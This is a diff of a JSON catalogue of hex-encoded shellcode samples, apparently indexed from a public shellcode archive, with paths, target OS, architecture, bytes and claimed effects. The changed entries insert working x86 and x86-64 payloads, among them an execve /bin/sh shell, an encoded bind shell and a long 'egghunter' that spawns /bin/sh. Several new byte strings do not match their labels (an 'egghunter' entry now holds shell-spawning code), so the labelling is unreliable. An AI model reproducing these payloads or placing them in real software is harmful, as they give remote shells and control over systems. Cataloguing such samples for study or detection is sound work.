@@ -1,25 +1,5 @@
 [
   {
-    "path": ".venv/lib/python3.11/site-packages/greenlet/tests/_test_extension.c",
-    "bucket": "ascii",
-    "os": ".venv",
-    "arch": null,
-    "length": 16,
-    "bytes": "74616b652074686174207375636b6121",
-    "claimed_effect": "_test_extension.c",
-    "supported": true
-  },
-  {
-    "path": ".venv/lib/python3.11/site-packages/zope/interface/_zope_interface_coptimizations.c",
-    "bucket": "ascii",
-    "os": ".venv",
-    "arch": null,
-    "length": 50,
-    "bytes": "54657374207768657468657220612073706563696669636174696f6e206973206f7220657874656e647320616e6f74686572",
-    "claimed_effect": "_zope_interface_coptimizations.c",
-    "supported": true
-  },
-  {
     "path": "Aix/execve_-bin-sh.c",
     "bucket": "other",
     "os": "aix",
@@ -1165,7 +1145,7 @@
     "os": "linux",
     "arch": "x86",
     "length": 38,
-    "bytes": "905090509050905031dbf7e3b0046a0a684d61726b6845676720b30189e1b209cd80b001cd80",
+    "bytes": "fc31c9f7e16681caff0f426a21588d5a04cd803cf274eeb89050905089d7af75e9af75e6ffe7",
     "claimed_effect": "Egg_Hunter_Shellcode.c",
     "supported": true
   },
@@ -2104,8 +2084,8 @@
     "bucket": "hex",
     "os": "linux",
     "arch": "x86",
-    "length": 29,
-    "bytes": "eb1658408178f86567672075f68178fc6d61726b75edffe0e8e5ffffff",
+    "length": 34,
+    "bytes": "83e80889c1ba08000000b804000000bb01000000cd80b801000000bb00000000cd80",
     "claimed_effect": "egghunt_shellcode.c",
     "supported": true
   },
@@ -2114,8 +2094,8 @@
     "bucket": "hex",
     "os": "linux",
     "arch": "x86",
-    "length": 16,
-    "bytes": "6681c9ff0f416a4358cd803cf274f1b8",
+    "length": 28,
+    "bytes": "31c031d252686e2f7368682f2f626989e3525389e15289e2b00bcd80",
     "claimed_effect": "egghunter_shellcode.c",
     "supported": true
   },
@@ -2684,8 +2664,8 @@
     "bucket": "hex",
     "os": "linux",
     "arch": "x86",
-    "length": 69,
-    "bytes": "31c0506874636174686e2f6e6568722f6269682f2f757389e3506836363636682d6c747089e250686e2f7368682f2f626966682d6589e15051525389e6b00b89f131d2cd80",
+    "length": 93,
+    "bytes": "eb115e31c9b14580740eff1380e90175f6eb05e8eaffffff22d3437b677072677b7d3c7d767b613c717a7b3c3c66609af0437b252525257b3e7f67639af1437b7d3c607b7b3c3c717a757b3e769af2434241409af5a3189ae222c1de93",
     "claimed_effect": "netcat_bindshell_port_6666.c",
     "supported": true
   },
@@ -3554,10 +3534,10 @@
     "bucket": "hex",
     "os": "linux",
     "arch": "x86_64",
-    "length": 0,
-    "bytes": null,
+    "length": 212,
+    "bytes": "eb094831ff48f7e7575ec3554889e5e8eeffffff04294080c702ffc60f0550e8deffffff0431488b3c245681c6030105396681ee0101564889e680c2100f05e8beffffff0432488b7df80f05e8b1ffffff042b488b7df84889e680c218524889e20f054989c0e897ffffff4c89c74080ec184889e680c2180f0548b870417a7a573072644889e748af75424831c04c89c74831f64080c60204210f054831c0042148ffce75f40f05e855ffffff50043b49b82f2f62696e2f736841504889e7524889e2574889e64889ec5d0f054831c0043c0f05",
     "claimed_effect": "access()_Egghunter.c",
-    "supported": false
+    "supported": true
   },
   {
     "path": "Linux/x86-64/add_user_with_passwd.c",
@@ -4225,7 +4205,7 @@
     "os": "windows",
     "arch": null,
     "length": 35,
-    "bytes": "5589e583ec18c745fc10c9ea77c7442404e8030000c70424e80300008b45fcffd0c9c3",
+    "bytes": "5589e583ec18c745fc538a837cc7442404d0030000c70424010e00008b45fcffd0c9c3",
     "claimed_effect": "Beep_Shellcode_(SP1-SP2).c",
     "supported": true
   },
